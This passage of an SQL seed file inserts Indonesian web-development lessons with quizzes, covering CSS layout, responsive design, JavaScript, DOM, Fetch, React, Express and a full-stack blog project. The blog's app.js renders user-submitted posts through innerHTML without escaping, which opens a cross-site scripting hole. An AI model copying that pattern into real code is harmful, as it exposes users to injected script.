> Mulai dengan HTML/CSS/JS murni sebelum framework.', '🎨', false, '[{"question":"Apa kepanjangan CSS?","options":["Computer Style Sheets","Cascading Style Sheets","Creative Style System","Colorful Style Sheets"],"answer":1,"explanation":"CSS = Cascading Style Sheets, bahasa untuk mendesain tampilan halaman web."},{"question":"Selector CSS untuk elemen dengan class ''btn''?","options":["#btn",".btn","btn","*btn"],"answer":1,"explanation":"Class dipilih dengan titik (.) di depan, jadi ''.btn''. ID pakai #, elemen tanpa prefix."},{"question":"Urutan box model dari luar ke dalam?","options":["content, padding, border, margin","margin, border, padding, content","margin, padding, border, content","padding, margin, border, content"],"answer":1,"explanation":"Dari luar ke dalam: margin → border → padding → content."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('css-layout-flexbox-grid', 3, 5, 'CSS Layout Flexbox & Grid', 'css-layout-flexbox-grid', 'Layout modern dengan Flexbox dan CSS Grid.', '# CSS Layout Flexbox & Grid


![CSS Layout Flexbox & Grid](https://sfile.chatglm.cn/images-ppt/7097fbf56a3e.jpg)

**Flexbox** dan **CSS Grid** adalah sistem layout modern CSS. Flexbox cocok untuk layout 1 dimensi (baris/kolom), Grid untuk 2 dimensi (baris dan kolom sekaligus).

## Flexbox Dasar

```css
.container {
    display: flex;
    flex-direction: row;       /* row | column */
    justify-content: center;   /* horizontal alignment */
    align-items: center;       /* vertical alignment */
    gap: 16px;
}

.item {
    flex: 1;                   /* grow shrink basis */
}
```

Contoh: navbar dengan logo di kiri dan menu di kanan.

```css
.navbar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 16px;
}
```

## Properti Flexbox Penting

```text
Container:
- display: flex
- flex-direction: row | column | row-reverse
- justify-content: flex-start | center | space-between | space-around
- align-items: stretch | center | flex-start | flex-end
- flex-wrap: nowrap | wrap
- gap: <length>

Item:
- flex: <grow> <shrink> <basis>
- order: <number>
- align-self: <alignment>
```

## CSS Grid

```css
.grid-container {
    display: grid;
    grid-template-columns: 1fr 1fr 1fr;   /* 3 kolom sama */
    grid-template-rows: 100px 200px;
    gap: 20px;
}

/* Grid dengan auto-fit responsif */
.cards {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 16px;
}
```

## Grid Area

```css
.layout {
    display: grid;
    grid-template-areas:
        "header header header"
        "sidebar main main"
        "footer footer footer";
    grid-template-columns: 200px 1fr 1fr;
    grid-template-rows: auto 1fr auto;
    min-height: 100vh;
}

.header { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main { grid-area: main; }
.footer { grid-area: footer; }
```

## Kapan Pakai Apa?

```text
FLEXBOX                 GRID
- 1 dimensi             - 2 dimensi
- Navbar, button row    - Page layout, gallery
- Align items           - Complex grid
- Content-driven        - Layout-driven
```

Subgrid yang merupakan bagian dari CSS Grid Level 2 memungkinkan child mengikuti grid parent, sangat berguna untuk membuat komponen yang rapi dan sejajar sempurna.

> **Tips:** Banyak layout bisa pakai keduanya. Mulai dengan Flexbox untuk hal sederhana, Grid untuk layout kompleks. Mereka bisa dikombinasikan!



## Studi Kasus: Website E-Commerce

HTML untuk struktur, CSS untuk styling, JavaScript untuk interaktivitas.

## Tips

> Mulai dengan HTML/CSS/JS murni sebelum framework.', '📐', false, '[{"question":"Flexbox paling cocok untuk layout?","options":["2 dimensi kompleks","1 dimensi (baris/kolom)","Animasi","Tabel data"],"answer":1,"explanation":"Flexbox dirancang untuk layout 1 dimensi (satu baris atau satu kolom). Untuk 2 dimensi gunakan Grid."},{"question":"Properti CSS untuk membuat container menjadi flex?","options":["display: block","display: flex","flex: 1","layout: flex"],"answer":1,"explanation":"display: flex mengaktifkan flexbox pada elemen container sehingga children-nya jadi flex items."},{"question":"Properti flexbox untuk alignment horizontal?","options":["align-items","justify-content","flex-direction","flex-wrap"],"answer":1,"explanation":"justify-content mengatur alignment sepanjang main axis (horizontal jika flex-direction: row)."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('responsive-design', 3, 6, 'Responsive Design', 'responsive-design', 'Media query, mobile-first, dan viewport untuk responsive web.', '# Responsive Design


![Responsive Design](https://sfile.chatglm.cn/images-ppt/20d54ef6908a.jpg)

**Responsive design** membuat website tampil baik di semua ukuran layar: desktop, tablet, dan mobile. Lebih dari 50% traffic web berasal dari mobile, jadi responsive wajib hukumnya.

## Viewport Meta

```html
<!-- WAJIB di <head> agar responsive bekerja -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```

## Media Query

Media query menerapkan style berbeda berdasarkan ukuran layar.

```css
/* Default (mobile-first) */
.container {
    padding: 10px;
    flex-direction: column;
}

/* Tablet >= 768px */
@media (min-width: 768px) {
    .container {
        padding: 20px;
        flex-direction: row;
    }
}

/* Desktop >= 1024px */
@media (min-width: 1024px) {
    .container {
        max-width: 1200px;
        margin: 0 auto;
    }
}

/* Orientation landscape */
@media (orientation: landscape) {
    .hero { height: 100vh; }
}
```

## Breakpoint Umum

```text
Mobile      : < 768px
Tablet      : 768px - 1023px
Desktop     : 1024px - 1439px
Large       : >= 1440px
```

## Unit Responsif

```css
/* Gunakan unit relatif, bukan px fix */
h1 {
    font-size: clamp(1.5rem, 5vw, 3rem);   /* responsive font */
}
.container {
    width: 90%;
    max-width: 1200px;
    padding: 2vw;
}
img {
    max-width: 100%;       /* gambar tidak overflow */
    height: auto;
}
```

## Mobile-First Approach

Mulai dengan style mobile dulu (paling sederhana), lalu tambah kompleksitas untuk layar lebih besar.

```css
/* Mobile (default) */
.menu { display: none; }
.hamburger { display: block; }

/* Desktop */
@media (min-width: 768px) {
    .menu { display: flex; }
    .hamburger { display: none; }
}
```

## Tips Responsive

```text
1. Selalu set viewport meta
2. Gunakan unit relatif (%, vw, vh, rem)
3. Gambar: max-width 100%
4. Mobile-first approach
5. Test di banyak device
6. Gunakan DevTools device emulation
```

Gunakan unit seperti rem untuk font dan em untuk spacing agar skala mengikuti preferensi ukuran teks pengguna, sehingga meningkatkan aksesibilitas web Anda.

> **Tips:** Tekan F12 di browser → klik icon device (Ctrl+Shift+M) untuk simulasi berbagai perangkat. Test di mobile asli juga penting!



## Studi Kasus: Website E-Commerce

HTML untuk struktur, CSS untuk styling, JavaScript untuk interaktivitas.

## Tips

> Mulai dengan HTML/CSS/JS murni sebelum framework.', '📱', false, '[{"question":"Tag meta yang WAJIB untuk responsive web?","options":["<meta charset>","<meta name=''viewport''>","<meta description>","<meta keywords>"],"answer":1,"explanation":"<meta name=''viewport'' content=''width=device-width, initial-scale=1.0''> mengatur skala viewport agar responsive bekerja di mobile."},{"question":"Pendekatan mobile-first berarti?","options":["Desain desktop dulu","Desain mobile dulu lalu scale up","Hanya mobile","Tampilan sama semua device"],"answer":1,"explanation":"Mobile-first: tulis style mobile sebagai default, lalu tambah style untuk layar lebih besar via min-width media query."},{"question":"CSS function untuk font size responsif otomatis?","options":["resize()","clamp()","scale()","auto()"],"answer":1,"explanation":"clamp(min, preferred, max) membuat font size menyesuaikan otomatis dalam rentang tertentu, misal: clamp(1rem, 5vw, 3rem)."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('javascript-dasar', 3, 7, 'JavaScript Dasar', 'javascript-dasar', 'Variabel (let/const), tipe data, operator, dan kontrol flow JS.', '# JavaScript Dasar


![JavaScript Dasar](https://sfile.chatglm.cn/images-ppt/0193c69c0227.png)

**JavaScript** adalah bahasa pemrograman web yang berjalan di browser (dan server via Node.js). JavaScript menambah interaktivitas dan logic ke halaman web.

## Variabel

```javascript
// const - tidak bisa di-assign ulang (rekomendasi default)
const nama = "Budi";
const PI = 3.14;

// let - bisa di-assign ulang
let umur = 25;
umur = 26;

// var - lama, hindari (function-scoped)
var x = 10;

// var HOISTING & global scope bikin bermasalah
```

## Tipe Data

```javascript
const str    = "Halo";          // string
const num    = 42;              // number
const float  = 3.14;            // number (float juga)
const bool   = true;            // boolean
const nul    = null;            // null
const undef  = undefined;       // undefined
const arr    = [1, 2, 3];       // array
const obj    = {a: 1, b: 2};    // object
const sym    = Symbol("id");    // symbol

// Cek tipe
console.log(typeof nama);       // "string"
console.log(Array.isArray(arr)); // true
```

## Operator dan String

```javascript
// Aritmatika
5 + 3;   // 8
10 % 3;  // 1
2 ** 3;  // 8

// Perbandingan
5 == "5";   // true  (loose, konversi tipe) - HINDARI
5 === "5";  // false (strict) - REKOMENDASI

// Template literal
const nama = "Andi";
console.log(`Halo ${nama}, umur ${25}`);

// String methods
"Halo".length;          // 4
"Halo".toUpperCase();   // HALO
"Halo Dunia".split(" "); // ["Halo", "Dunia"]
```

## Kontrol Flow

```javascript
// If/else
const umur = 18;
if (umur >= 17) {
    console.log("Dewasa");
} else {
    console.log("Anak");
}

// For loop
for (let i = 0; i < 5; i++) {
    console.log(i);
}

// For...of (array)
const arr = [10, 20, 30];
for (const item of arr) {
    console.log(item);
}

// Array methods
[1, 2, 3].map(x => x * 2);       // [2, 4, 6]
[1, 2, 3].filter(x => x > 1);    // [2, 3]
[1, 2, 3].reduce((a, b) => a + b); // 6
```

## Function

```javascript
// Function declaration
function tambah(a, b) {
    return a + b;
}

// Arrow function
const kurang = (a, b) => a - b;
const sapa = nama => `Halo ${nama}`;

console.log(tambah(2, 3));  // 5
```

> **Tips:** Selalu gunakan `===` (strict equality) bukan `==`. Default ke `const`, ganti ke `let` hanya jika perlu re-assign. Hindari `var`.



## Studi Kasus: Website E-Commerce

HTML untuk struktur, CSS untuk styling, JavaScript untuk interaktivitas.

## Tips

> Mulai dengan HTML/CSS/JS murni sebelum framework.', '⚙️', false, '[{"question":"Kata kunci untuk variabel yang TIDAK bisa di-assign ulang?","options":["let","var","const","static"],"answer":2,"explanation":"const membuat variabel yang tidak bisa di-assign ulang. Gunakan const sebagai default, let jika perlu re-assign."},{"question":"Operator perbandingan strict equality di JavaScript?","options":["==","===","=","!="],"answer":1,"explanation":"=== adalah strict equality yang membandingkan nilai DAN tipe. == melakukan konversi tipe yang bisa menimbulkan bug."},{"question":"Cara menulis arrow function di JavaScript?","options":["function => () {}","() => {}","=> () {}","function() => {}"],"answer":1,"explanation":"Sintaks arrow function: (param) => expression atau (param) => { statements }. Contoh: const f = (a, b) => a + b;"}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('dom-manipulation', 3, 8, 'DOM Manipulation', 'dom-manipulation', 'Memanipulasi DOM: getElementById, querySelector, event listener.', '# DOM Manipulation


![DOM Manipulation](https://sfile.chatglm.cn/images-ppt/d92a0f5df781.jpg)

**DOM (Document Object Model)** adalah representasi struktur HTML sebagai object JavaScript. Dengan DOM, JavaScript bisa mengubah konten, style, dan struktur halaman secara dinamis.

## Mengakses Elemen

```javascript
// By ID (1 elemen)
const header = document.getElementById("header");

// By selector (1 elemen - REKOMENDASI)
const btn = document.querySelector(".btn");
const firstItem = document.querySelector("ul li:first-child");

// By selector (semua elemen - NodeList)
const items = document.querySelectorAll(".item");

// By class/tag (HTMLCollection)
const cards = document.getElementsByClassName("card");
const buttons = document.getElementsByTagName("button");
```

## Mengubah Konten dan Style

```javascript
const el = document.querySelector("#title");

// Konten
el.textContent = "Judul Baru";           // text only
el.innerHTML = "<b>Judul</b>";           // HTML
el.innerText = "Teks tampil";

// Atribut
el.setAttribute("data-id", "123");
el.classList.add("active");
el.classList.remove("hidden");
el.classList.toggle("dark");

// Style
el.style.color = "red";
el.style.fontSize = "24px";
el.style.display = "none";
```

## Membuat dan Menambah Elemen

```javascript
// Buat elemen baru
const newDiv = document.createElement("div");
newDiv.textContent = "Halo, saya elemen baru!";
newDiv.classList.add("card");

// Tambah ke DOM
document.body.appendChild(newDiv);
document.querySelector(".container").prepend(newDiv);

// Hapus elemen
const old = document.querySelector(".old");
old.remove();
```

## Event Listener

```javascript
const btn = document.querySelector("#myBtn");

btn.addEventListener("click", function(e) {
    console.log("Tombol diklik!", e.target);
});

// Arrow function
btn.addEventListener("click", (e) => {
    alert("Klik!");
});

// Event lain
input.addEventListener("input", (e) => {
    console.log(e.target.value);
});

form.addEventListener("submit", (e) => {
    e.preventDefault();  // cegah reload
    console.log("Form submit");
});
```

## Contoh: Counter Interaktif

```javascript
let count = 0;
const display = document.querySelector("#count");
const incBtn = document.querySelector("#inc");

incBtn.addEventListener("click", () => {
    count++;
    display.textContent = count;
});
```

Saat memanipulasi DOM, perhatikan performa. Operasi DOM mahal — minimalkan reflow dan repaint dengan batch update. Gunakan DocumentFragment saat menambah banyak elemen, lalu append sekali. Untuk aplikasi kompleks dengan banyak interaksi, pertimbangkan framework seperti React atau Vue yang mengelola DOM secara efisien via virtual DOM. Pahami juga event bubbling dan capturing: event naik dari child ke parent, berguna untuk delegation. Beberapa event punya default action yang bisa dicegah dengan preventDefault. Selalu bersihkan event listener yang tidak terpakai untuk mencegah memory leak, terutama di Single Page Application yang berjalan lama di browser.

> **Tips:** Gunakan `event delegation` untuk banyak elemen serupa. Pasang listener di parent, cek `e.target` — lebih efisien daripada pasang listener di setiap child.



## Studi Kasus: Website E-Commerce

HTML untuk struktur, CSS untuk styling, JavaScript untuk interaktivitas.

## Tips

> Mulai dengan HTML/CSS/JS murni sebelum framework.', '🌳', false, '[{"question":"Method untuk memilih 1 elemen dengan selector CSS?","options":["getElementById","querySelector","querySelectorAll","getElement"],"answer":1,"explanation":"querySelector() memilih elemen pertama yang cocok dengan selector CSS, mirip jQuery. Lebih fleksibel dari getElementById."},{"question":"Method untuk menambah class pada elemen?","options":["element.add(''cls'')","element.class.add(''cls'')","element.classList.add(''cls'')","element.className.add(''cls'')"],"answer":2,"explanation":"element.classList.add(''cls'') menambah class. Ada juga remove(), toggle(), dan contains()."},{"question":"Method untuk mencegah reload saat form disubmit?","options":["e.stop()","e.preventDefault()","e.cancel()","e.returnFalse()"],"answer":1,"explanation":"e.preventDefault() mencegah aksi default event, misal reload halaman saat submit form atau navigasi saat klik link."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('fetch-api-ajax', 3, 9, 'Fetch API & AJAX', 'fetch-api-ajax', 'HTTP request dengan Fetch API, async/await, dan JSON.', '# Fetch API & AJAX


![Fetch API & AJAX](https://sfile.chatglm.cn/images-ppt/573cdc58d69c.jpg)

**Fetch API** adalah cara modern JavaScript melakukan HTTP request ke server (AJAX). Fetch mengembalikan Promise, cocok dipakai dengan `async/await`.

## Fetch Dasar

```javascript
// GET request sederhana
fetch("https://api.example.com/users")
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error("Error:", error));
```

## Async/Await (REKOMENDASI)

```javascript
async function getUsers() {
    try {
        const response = await fetch("https://api.example.com/users");
        if (!response.ok) {
            throw new Error(`HTTP error: ${response.status}`);
        }
        const users = await response.json();
        console.log(users);
    } catch (error) {
        console.error("Gagal mengambil data:", error);
    }
}

getUsers();
```

## POST Request

```javascript
async function tambahUser(user) {
    const response = await fetch("https://api.example.com/users", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Authorization": "Bearer token123"
        },
        body: JSON.stringify(user)
    });
    return response.json();
}

tambahUser({ nama: "Budi", umur: 25 });
```

## Method HTTP Lain

```javascript
// PUT - update seluruh resource
await fetch(`/api/users/1`, {
    method: "PUT",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ nama: "Budi Update", umur: 26 })
});

// DELETE
await fetch(`/api/users/1`, { method: "DELETE" });
```

## Handle Response

```javascript
const res = await fetch("/api/data");

res.ok;          // true jika status 2xx
res.status;      // 200, 404, 500, dll
res.headers.get("Content-Type");

// Body parsing
const json = await res.json();      // JSON
const text = await res.text();      // plain text
const blob = await res.blob();      // file/binary
```

## Contoh: Tampilkan Data ke DOM

```javascript
async function tampilkanUser() {
    const res = await fetch("/api/users");
    const users = await res.json();

    const list = document.querySelector("#user-list");
    users.forEach(u => {
        const li = document.createElement("li");
        li.textContent = `${u.nama} (${u.umur})`;
        list.appendChild(li);
    });
}
```

Untuk produksi, pertimbangkan gunakan library seperti Axios yang menangani interceptor, timeout, dan transformasi response otomatis. Selalu set timeout agar request tidak menggantung selamanya, dan implementasikan retry dengan exponential backoff untuk transient error. Perhatikan CORS (Cross-Origin Resource Sharing) — browser memblokir request cross-origin kecuali server mengizinkan via header. Untuk data sensitif, kirim via HTTPS dan jangan simpan token di localStorage (gunakan httpOnly cookie). Cache response yang jarang berubah untuk mengurangi request. Untuk upload file, gunakan FormData, dan progress upload bisa dipantau via event handler pada XMLHttpRequest.

> **Tips:** Selalu handle error dengan try/catch dan cek `response.ok`. Jangan asumsikan request selalu sukses — jaringan bisa gagal, server bisa down.



## Studi Kasus: Website E-Commerce

HTML untuk struktur, CSS untuk styling, JavaScript untuk interaktivitas.

## Tips

> Mulai dengan HTML/CSS/JS murni sebelum framework.', '📡', false, '[{"question":"Fetch API mengembalikan tipe data apa?","options":["Callback","Promise","Observable","Stream"],"answer":1,"explanation":"fetch() mengembalikan Promise yang resolve ke Response object, sehingga bisa pakai .then() atau async/await."},{"question":"Method HTTP untuk mengirim data baru ke server?","options":["GET","POST","DELETE","HEAD"],"answer":1,"explanation":"POST digunakan untuk membuat resource baru. Body request berisi data yang akan disimpan."},{"question":"Method JavaScript untuk convert object ke JSON string?","options":["JSON.parse()","JSON.stringify()","JSON.toString()","JSON.convert()"],"answer":1,"explanation":"JSON.stringify() mengubah object JS menjadi string JSON untuk dikirim via fetch. JSON.parse() kebalikannya."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('frontend-framework-react', 3, 10, 'Frontend Framework React', 'frontend-framework-react', 'Dasar React: component, props, state, dan JSX.', '# Frontend Framework React


![Frontend Framework React](https://sfile.chatglm.cn/images-ppt/9c4f823056e5.jpg)

**React** adalah library JavaScript buatan Facebook (Meta) untuk membangun UI berbasis component. React populer karena deklaratif, berbasis component, dan ekosistemnya besar.

## Konsep Inti React

```text
1. Component  - UI dibagi jadi bagian reusable
2. JSX        - sintaks HTML dalam JavaScript
3. Props      - data dari parent ke child
4. State      - data internal component (mutable)
5. Hooks      - function khusus (useState, useEffect)
```

## Membuat Component

```jsx
// Functional component
function Welcome({ nama }) {
    return <h1>Halo, {nama}!</h1>;
}

// Pakai component
function App() {
    return (
        <div>
            <Welcome nama="Budi" />
            <Welcome nama="Andi" />
        </div>
    );
}
```

## State dengan useState

```jsx
import { useState } from "react";

function Counter() {
    const [count, setCount] = useState(0);

    return (
        <div>
            <p>Nilai: {count}</p>
            <button onClick={() => setCount(count + 1)}>+ Tambah</button>
            <button onClick={() => setCount(0)}>Reset</button>
        </div>
    );
}
```

## Props

```jsx
function Card({ title, content, color = "white" }) {
    return (
        <div style={{ background: color }}>
            <h3>{title}</h3>
            <p>{content}</p>
        </div>
    );
}

function App() {
    return (
        <Card
            title="Judul Kartu"
            content="Isi kartu di sini."
            color="#ffe"
        />
    );
}
```

## useEffect (Side Effect)

```jsx
import { useState, useEffect } from "react";

function UserProfile({ userId }) {
    const [user, setUser] = useState(null);

    useEffect(() => {
        fetch(`/api/users/${userId}`)
            .then(res => res.json())
            .then(data => setUser(data));
    }, [userId]);  // jalankan saat userId berubah

    if (!user) return <p>Loading...</p>;
    return <div>{user.nama}</div>;
}
```

## List Rendering

```jsx
function TodoList({ todos }) {
    return (
        <ul>
            {todos.map(todo => (
                <li key={todo.id}>{todo.text}</li>
            ))}
        </ul>
    );
}
```

Ekosistem React sangat luas: Next.js untuk SSR atau SSG dan routing, React Router untuk SPA, Redux atau Zustand untuk state management global, dan React Query untuk data fetching dengan caching. Pelajari juga React Context untuk state ringan tanpa library tambahan. Konsep penting lain: controlled vs uncontrolled component, lifting state up, dan composition over inheritance. React 18 dan setelahnya membawa fitur seperti concurrent rendering dan automatic batching yang meningkatkan performa. Meskipun ada alternatif seperti Vue dan Svelte, menguasai React membuka peluang karir paling luas karena adopsi industri yang sangat tinggi. Mulailah dari React docs resmi di react.dev yang sangat berkualitas dan terus diperbarui.

> **Tips:** Selalu gunakan `key` unik saat render list. Jangan pakai index sebagai key jika list bisa berubah urutannya — bisa menyebabkan bug rendering.



## Studi Kasus: Website E-Commerce

HTML untuk struktur, CSS untuk styling, JavaScript untuk interaktivitas.

## Tips

> Mulai dengan HTML/CSS/JS murni sebelum framework.', '⚛️', false, '[{"question":"Apa itu JSX?","options":["Bahasa baru","Ekstensi sintaks HTML dalam JavaScript","Framework CSS","Library state"],"answer":1,"explanation":"JSX adalah ekstensi sintaks yang memungkinkan menulis HTML-like code dalam JavaScript, di-compile menjadi React.createElement()."},{"question":"Hook React untuk menyimpan state adalah?","options":["useEffect","useState","useRef","useMemo"],"answer":1,"explanation":"useState([initial]) mengembalikan [state, setState] untuk menyimpan dan mengubah state dalam functional component."},{"question":"Cara mengoper data dari parent ke child component?","options":["Via state","Via props","Via context","Via global variable"],"answer":1,"explanation":"Props adalah mekanisme mengirim data dari parent ke child component di React (one-way data flow)."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('backend-nodejs', 3, 11, 'Backend dengan Node.js', 'backend-nodejs', 'Node.js, Express, routing, dan REST API dasar.', '# Backend dengan Node.js


![Backend dengan Node.js](https://sfile.chatglm.cn/images-ppt/aa202d2999af.jpg)

**Node.js** adalah runtime JavaScript di server. Dengan **Express.js** (framework minimalis), kita bisa membangun REST API dengan cepat. Keunggulan: satu bahasa (JavaScript) untuk frontend dan backend.

## Setup Project

```bash
# Inisialisasi project
mkdir my-api && cd my-api
npm init -y

# Install Express
npm install express

# (Opsional) nodemon untuk auto-restart
npm install -D nodemon
```

## Server Express Dasar

```javascript
const express = require("express");
const app = express();
const PORT = 3000;

// Middleware: parse JSON body
app.use(express.json());

app.get("/", (req, res) => {
    res.json({ message: "Halo dari API!" });
});

app.listen(PORT, () => {
    console.log(`Server berjalan di http://localhost:${PORT}`);
});
```

## Routing dan REST API

```javascript
// Data dummy
let users = [
    { id: 1, nama: "Budi", umur: 25 },
    { id: 2, nama: "Andi", umur: 30 }
];

// GET semua user
app.get("/api/users", (req, res) => {
    res.json(users);
});

// GET user by ID
app.get("/api/users/:id", (req, res) => {
    const user = users.find(u => u.id === parseInt(req.params.id));
    if (!user) return res.status(404).json({ error: "User tidak ditemukan" });
    res.json(user);
});

// POST tambah user
app.post("/api/users", (req, res) => {
    const newUser = {
        id: users.length + 1,
        nama: req.body.nama,
        umur: req.body.umur
    };
    users.push(newUser);
    res.status(201).json(newUser);
});

// PUT update user
app.put("/api/users/:id", (req, res) => {
    const user = users.find(u => u.id === parseInt(req.params.id));
    if (!user) return res.status(404).json({ error: "Not found" });
    user.nama = req.body.nama;
    user.umur = req.body.umur;
    res.json(user);
});

// DELETE user
app.delete("/api/users/:id", (req, res) => {
    users = users.filter(u => u.id !== parseInt(req.params.id));
    res.status(204).send();
});
```

## Middleware

```javascript
// Logging middleware
app.use((req, res, next) => {
    console.log(`${req.method} ${req.url} - ${new Date().toISOString()}`);
    next();
});

// CORS sederhana
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    next();
});

// Error handler
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: "Server error" });
});
```

## Test API dengan curl

```bash
curl http://localhost:3000/api/users
curl -X POST -H "Content-Type: application/json" \
  -d ''{"nama":"Citra","umur":22}'' \
  http://localhost:3000/api/users
```

> **Tips:** Untuk produksi, gunakan database (PostgreSQL/MongoDB), validasi input (zod/joi), environment variable (dotenv), dan helmet untuk security headers.



## Studi Kasus: Website E-Commerce

HTML untuk struktur, CSS untuk styling, JavaScript untuk interaktivitas.

## Tips

> Mulai dengan HTML/CSS/JS murni sebelum framework.', '🟢', false, '[{"question":"Apa itu Node.js?","options":["Framework CSS","Runtime JavaScript di server","Database","Bahasa pemrograman baru"],"answer":1,"explanation":"Node.js adalah runtime yang memungkinkan JavaScript berjalan di server (di luar browser), menggunakan V8 engine."},{"question":"Framework paling populer untuk REST API di Node.js?","options":["Django","Express","Laravel","Spring"],"answer":1,"explanation":"Express.js adalah framework minimalis paling populer untuk Node.js. Untuk struktur lebih besar ada NestJS."},{"question":"Method HTTP untuk mengambil semua user dari endpoint /api/users?","options":["POST","GET","DELETE","PATCH"],"answer":1,"explanation":"GET digunakan untuk mengambil/membaca data. POST untuk membuat, PUT/PATCH untuk update, DELETE untuk hapus."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('project-website-lengkap', 3, 12, 'Project: Website Lengkap', 'project-website-lengkap', 'Membangun website full-stack lengkap dari frontend hingga backend.', '# Project: Website Lengkap


![Project: Website Lengkap](https://sfile.chatglm.cn/images-ppt/fb9ee1a14d97.png)

Saatnya menggabungkan semua yang Anda pelajari di Level 3! Kita akan membangun **Website Blog Full-Stack** dengan frontend HTML/CSS/JS dan backend Node.js/Express.

## Spesifikasi Project

- **Frontend**: HTML, CSS, JavaScript (Fetch API)
- **Backend**: Node.js + Express
- **Database**: In-memory (array) — bisa upgrade ke PostgreSQL
- **Fitur**: CRUD artikel blog (Create, Read, Update, Delete)

## Struktur Folder

```text
blog-app/
├── public/
│   ├── index.html
│   ├── style.css
│   └── app.js
├── server.js
└── package.json
```

## Backend (server.js)

```javascript
const express = require("express");
const app = express();
const path = require("path");

app.use(express.json());
app.use(express.static("public"));

let posts = [
    { id: 1, judul: "Halo Dunia", isi: "Post pertama saya!" }
];

app.get("/api/posts", (req, res) => res.json(posts));

app.post("/api/posts", (req, res) => {
    const post = { id: Date.now(), judul: req.body.judul, isi: req.body.isi };
    posts.push(post);
    res.status(201).json(post);
});

app.delete("/api/posts/:id", (req, res) => {
    posts = posts.filter(p => p.id !== parseInt(req.params.id));
    res.status(204).send();
});

app.listen(3000, () => console.log("Server: http://localhost:3000"));
```

## Frontend (index.html)

```html
<!DOCTYPE html>
<html>
<head>
    <title>My Blog</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header><h1>My Blog</h1></header>
    <main>
        <form id="post-form">
            <input id="judul" placeholder="Judul" required>
            <textarea id="isi" placeholder="Isi" required></textarea>
            <button type="submit">Posting</button>
        </form>
        <div id="posts"></div>
    </main>
    <script src="app.js"></script>
</body>
</html>
```

## Frontend Logic (app.js)

```javascript
async function loadPosts() {
    const res = await fetch("/api/posts");
    const posts = await res.json();
    const div = document.getElementById("posts");
    div.innerHTML = posts.map(p => `
        <article>
            <h3>${p.judul} <button onclick="hapus(${p.id})">Hapus</button></h3>
            <p>${p.isi}</p>
        </article>
    `).join("");
}

document.getElementById("post-form").addEventListener("submit", async (e) => {
    e.preventDefault();
    const judul = document.getElementById("judul").value;
    const isi = document.getElementById("isi").value;
    await fetch("/api/posts", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ judul, isi })
    });
    e.target.reset();
    loadPosts();
});

async function hapus(id) {
    await fetch(`/api/posts/${id}`, { method: "DELETE" });
    loadPosts();
}

loadPosts();
```

## Cara Menjalankan

```bash
npm install express
node server.js
# Buka http://localhost:3000
```

## Tantangan Lanjutan

- Tambahkan edit post (PUT)
- Gunakan database PostgreSQL + Prisma
- Tambahkan autentikasi (login/register)
- Tambahkan komentar per post
- Deploy ke Vercel/Render/Railway

> **Tips:** Kerjakan fitur satu per satu, test sebelum lanjut. Commit sering di Git. Bangun versi minimal dulu, lalu tambah fitur (MVP approach).



## Studi Kasus: Website E-Commerce

HTML untuk struktur, CSS untuk styling, JavaScript untuk interaktivitas.

## Tips

> Mulai dengan HTML/CSS/JS murni sebelum framework.', '🚀', true, '[{"question":"Apa arti CRUD dalam web development?","options":["Create, Read, Update, Delete","Copy, Run, Update, Drop","Create, Run, Use, Debug","Connect, Request, Update, Download"],"answer":0,"explanation":"CRUD = Create, Read, Update, Delete — empat operasi dasar dalam aplikasi yang mengelola data."},{"question":"Middleware Express untuk menyajikan file static (HTML/CSS/JS)?","options":["app.static()","express.static()","app.serve()","app.files()"],"answer":1,"explanation":"express.static(''public'') menyajikan file statis dari folder ''public'' sehingga bisa diakses via URL langsung."},{"question":"Pendekatan terbaik membangun project kompleks?","options":["Bangun semua sekaligus","MVP - versi minimal dulu lalu tambah fitur","Tunggu inspirasi","Copy paste dari tutorial"],"answer":1,"explanation":"MVP (Minimum Viable Product) approach: bangun versi paling sederhana yang berfungsi dulu, lalu tambah fitur secara bertahap. Lebih mudah dikelola dan testable."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('pengenalan-jaringan', 4, 1, 'Pengenalan Jaringan', 'pengenalan-jaringan', 'Dasar jaringan komputer: LAN, WAN, topologi, dan komponennya.', '# Pengenalan Jaringan


![Pengenalan Jaringan](https://sfile.chatglm.cn/images-ppt/bf3612922e44.png)

**Jaringan komputer** adalah kumpulan dua atau lebih perangkat komputer yang saling terhubung melalui media komunikasi untuk berbagi sumber daya (data, printer, internet) dan saling berkomunikasi. Sejak munculnya ARPANET pada 1969, jaringan berevolusi menjadi fondasi internet, aplikasi mobile, cloud computing, hingga Internet of Things (IoT). Memahami konsep dasar jaringan sangat penting bagi developer, sysadmin, dan engineer modern karena hampir semua aplikasi saat ini bergantung pada konektivitas yang andal.

